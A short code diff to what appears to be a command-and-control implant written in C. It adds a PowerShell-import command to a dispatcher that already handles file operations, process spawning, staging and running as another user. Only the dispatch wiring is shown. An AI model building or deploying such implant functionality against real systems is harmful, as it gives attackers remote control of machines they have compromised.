@@ -13,6 +13,7 @@
 #include "self.h"
 #include "spawn.h"
 #include "stage.h"
+#include "powershell.h"
 
 // Localhost for little endian
 #define LOCALHOST 0x0100007f
@@ -113,6 +114,9 @@ void TaskDispatch(int cmd, char* buffer, int size)
 			break;
 		case COMMAND_FILE_MKDIR:
 			FilesystemMkdir(buffer, size);
+			break;
+		case COMMAND_PSH_IMPORT:
+			PowershellImport(buffer, size);
 			break;
 		case COMMAND_RUNAS:
 			RunAsUser(buffer, size);
